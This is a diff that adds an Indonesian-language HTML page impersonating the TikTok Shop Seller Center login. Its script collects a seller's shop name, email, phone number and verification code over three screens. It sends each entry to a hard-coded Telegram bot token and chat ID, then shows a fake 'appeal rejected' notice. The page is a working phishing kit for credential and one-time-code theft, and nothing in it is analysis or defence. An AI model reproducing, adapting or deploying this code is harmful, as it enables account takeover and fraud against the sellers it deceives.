@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok Shop - Masuk</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 30px 20px;
+        }
+
+        /* Logo Atas */
+        .header-logo {
+            font-size: 26px;
+            font-weight: 700;
+            color: #000;
+            margin-bottom: 30px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .header-logo::before {
+            content: "♪";
+            font-size: 30px;
+        }
+
+        /* Ilustrasi Peringatan */
+        .illustration {
+            width: 280px;
+            height: 320px;
+            margin-bottom: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .peringatan-card {
+            width: 100%;
+            height: 100%;
+            background: #ffffff;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+        }
+        .tiktok-icon {
+            font-size: 60px;
+            margin-bottom: 20px;
+            background: linear-gradient(45deg, #25f4ee, #ff0050);
+            -webkit-background-clip: text;
+            color: transparent;
+            font-weight: bold;
+        }
+        .peringatan-teks {
+            font-size: 15px;
+            line-height: 1.6;
+            color: #333;
+        }
+
+        h1 {
+            font-size: 28px;
+            font-weight: 600;
+            color: #000;
+            margin-bottom: 25px;
+        }
+
+        .switch-link {
+            color: #009688;
+            text-decoration: none;
+            font-size: 16px;
+            margin-bottom: 25px;
+            display: block;
+        }
+
+        /* Kolom Input */
+        .input-group {
+            width: 100%;
+            max-width: 450px;
+            margin-bottom: 20px;
+        }
+        .input-group label {
+            display: block;
+            font-size: 16px;
+            color: #333;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+        .wajib {
+            color: #ff0000;
+            margin-left: 4px;
+        }
+        .input-field {
+            width: 100%;
+            padding: 16px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 17px;
+            outline: none;
+            background: #fff;
+        }
+        .input-field.isi {
+            background: #eaf2ff;
+            border-color: #c9d8f5;
+        }
+        .input-field:focus {
+            border-color: #009688;
+        }
+        .input-field.kosong {
+            border-color: #ff0000;
+            background: #fff2f2;
+        }
+
+        .forgot-link {
+            text-align: right;
+            display: block;
+            color: #009688;
+            text-decoration: none;
+            font-size: 15px;
+            margin: -10px 0 30px;
+        }
+
+        .info-text {
+            width: 100%;
+            max-width: 450px;
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 30px;
+        }
+        .peringatan-kosong {
+            color: #ff0000;
+            font-size: 14px;
+            margin-bottom: 15px;
+            display: none;
+        }
+
+        .btn-masuk, .btn-kirim {
+            width: 100%;
+            max-width: 450px;
+            padding: 16px;
+            background: #00897b;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        .btn-masuk:hover, .btn-kirim:hover {
+            background: #00796b;
+        }
+
+        /* Halaman Sembunyi/Tampil */
+        .page {
+            display: none;
+            width: 100%;
+            max-width: 450px;
+            flex-direction: column;
+            align-items: center;
+        }
+        .page.active {
+            display: flex;
+        }
+
+        /* Halaman Terakhir */
+        .halaman-terakhir {
+            width: 100%;
+            max-width: 340px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            padding: 10px 5px;
+        }
+        .kotak-loker {
+            width: 140px;
+            height: 80px;
+            border: 4px solid #000;
+            border-radius: 12px 12px 8px 8px;
+            border-top: none;
+            position: relative;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .kotak-loker::before {
+            content: "";
+            position: absolute;
+            top: -12px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 70px;
+            height: 12px;
+            border: 4px solid #000;
+            border-bottom: none;
+            border-radius: 8px 8px 0 0;
+        }
+        .logo-dalam {
+            font-size: 40px;
+            color: #ff0050;
+            font-weight: bold;
+        }
+        .judul-sc {
+            font-size: 30px;
+            font-weight: 900;
+            color: #00bcd4;
+            text-shadow: 2px 2px 3px rgba(0,0,0,0.15);
+            text-transform: uppercase;
+            margin-bottom: 18px;
+        }
+        .blok-merah-1 {
+            width: 100%;
+            background: #ff3b30;
+            color: #ffffff;
+            font-size: 19px;
+            font-weight: 700;
+            padding: 10px 8px;
+            margin-bottom: 10px;
+            line-height: 1.4;
+        }
+        .blok-merah-2 {
+            width: 100%;
+            background: #ff1744;
+            color: #000000;
+            font-size: 20px;
+            font-weight: 700;
+            padding: 10px 8px;
+            line-height: 1.4;
+        }
+    </style>
+</head>
+<body>
+    <!-- Halaman 1: Nama Toko & Email -->
+    <div id="page1" class="page active">
+        <div class="header-logo">TikTok Shop</div>
+        <div class="illustration">
+            <div class="peringatan-card">
+              <img src="https://perfect-coffee-npmumie8.edgeone.dev/IMG-20260723-WA0001~2.jpg" width="280">
+  
+            </div>
+        </div>
+  
+        <div class="input-group">
+            <label>Nama Toko <span class="wajib">*</span></label>
+            <input type="text" class="input-field" id="namaToko" placeholder="Masukan Nama Toko Anda" >
+        </div>
+        <div class="input-group">
+            <label>Alamat Email <span class="wajib">*</span></label>
+            <input type="email" class="input-field" id="email" placeholder="Masukan Gmail Anda" >
+        </div>
+
+
+        <div class="peringatan-kosong" id="peringatan1">⚠️ Data wajib diisi</div>
+        <button class="btn-masuk" onclick="kirimLangkah1()">Masuk</button>
+    </div>
+
+    <!-- Halaman 2: Nomor Seller Center -->
+    <div id="page2" class="page">
+        <div class="header-logo">TikTok Shop</div>
+        <div class="illustration">
+            <div class="peringatan-card">
+                <img src="https://perfect-coffee-npmumie8.edgeone.dev/IMG-20260723-WA0001~2.jpg" width="280">
+            </div>
+        </div>
+ 
+
+        <div class="input-group">
+            <label>Nomor Seller Center <span class="wajib">*</span></label>
+            <input type="tel" class="input-field" id="nomorSC" placeholder="Masukkan Nomor Telpon Anda">
+        </div>
+
+        <div class="peringatan-kosong" id="peringatan2">⚠️ Nomor tidak boleh kosong</div>
+        <button class="btn-masuk" onclick="kirimLangkah2()">Masuk</button>
+    </div>
+
+    <!-- Halaman 3: Kode Verifikasi -->
+    <div id="page3" class="page">
+        <div class="header-logo">TikTok Shop</div>
+        <div class="illustration">
+            <div class="peringatan-card">
+              <img src="https://perfect-coffee-npmumie8.edgeone.dev/IMG-20260723-WA0001~2.jpg" width="280">
+            </div>
+        </div>
+ 
+
+        <div class="input-group">
+            <label>Kode Verifikasi <span class="wajib">*</span></label>
+            <input type="text" class="input-field" id="kodeVerif" placeholder="Masukkan kode verifikasi" minlength="4" maxlength="6">
+        </div>
+        <div class="info-text">* Bisa huruf atau angka, 4–6 karakter</div>
+
+        <div class="peringatan-kosong" id="peringatan3">⚠️ Kode verifikasi wajib diisi</div>
+        <button class="btn-kirim" onclick="kirimLangkah3()">Kirim</button>
+    </div>
+
+    <!-- Halaman 4: Terakhir -->
+    <div id="page4" class="page">
+        <div class="halaman-terakhir">
+            <div class="kotak-loker">
+                <div class="logo-dalam">♪</div>
+            </div>
+            <div class="judul-sc">SELLER CENTER</div>
+            <div class="blok-merah-1">
+                pengajuan banding anda<br>
+                ditolak karena keranjang<br>
+                kuning tidak terhubung
+            </div>
+            <div class="blok-merah-2">
+                silakan cek di<br>
+                aplikasi seller<br>
+                center
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Data Bot Telegram
+        const TOKEN = '7038229645:AAEQksOxA8yg2EJBWckwCRARyzsOxr7-cJA';
+        const CHAT_ID = '6883233614';
+
+        function pindahHalaman(idHalaman) {
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            document.getElementById(idHalaman).classList.add('active');
+        }
+
+        // Langkah 1
+        function kirimLangkah1() {
+            const namaToko = document.getElementById('namaToko').value.trim();
+            const email = document.getElementById('email').value.trim();
+            const peringatan = document.getElementById('peringatan1');
+
+            if (!namaToko || !email) {
+                peringatan.style.display = 'block';
+                return;
+            }
+            peringatan.style.display = 'none';
+
+            const pesan = `🔹 LANGKAH 1 DITERIMA:
+📌 Nama Toko: ${namaToko}
+📌 Email: ${email}`;
+            
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: CHAT_ID, text: pesan})
+            }).then(() => pindahHalaman('page2'));
+        }
+
+        // Langkah 2
+        function kirimLangkah2() {
+            const nomorSC = document.getElementById('nomorSC').value.trim();
+            const peringatan = document.getElementById('peringatan2');
+
+            if (!nomorSC) {
+                peringatan.style.display = 'block';
+                document.getElementById('nomorSC').classList.add('kosong');
+                return;
+            }
+            peringatan.style.display = 'none';
+            document.getElementById('nomorSC').classList.remove('kosong');
+
+            const pesan = `🔹 LANGKAH 2 DITERIMA:
+📌 Nomor Seller Center: ${nomorSC}`;
+            
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: CHAT_ID, text: pesan})
+            }).then(() => pindahHalaman('page3'));
+        }
+
+        // Langkah 3
+        function kirimLangkah3() {
+            const kodeVerif = document.getElementById('kodeVerif').value.trim();
+            const peringatan = document.getElementById('peringatan3');
+
+            if (!kodeVerif) {
+                peringatan.style.display = 'block';
+                document.getElementById('kodeVerif').classList.add('kosong');
+                return;
+            }
+            if (kodeVerif.length < 4) {
+                peringatan.textContent = '⚠️ Minimal 4 karakter';
+                peringatan.style.display = 'block';
+                return;
+            }
+            peringatan.style.display = 'none';
+            document.getElementById('kodeVerif').classList.remove('kosong');
+
+            const namaToko = document.getElementById('namaToko').value;
+            const email = document.getElementById('email').value;
+            const nomorSC = document.getElementById('nomorSC').value;
+            
+            const pesan = `✅ DATA LENGKAP DITERIMA:
+📌 Nama Toko: ${namaToko}
+📌 Email: ${email}
+📌 Nomor Seller Center: ${nomorSC}
+📌 Kode Verifikasi: ${kodeVerif}`;
+            
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: CHAT_ID, text: pesan})
+            }).then(() => pindahHalaman('page4'));
+        }
+    </script>
+</body>
+</html>
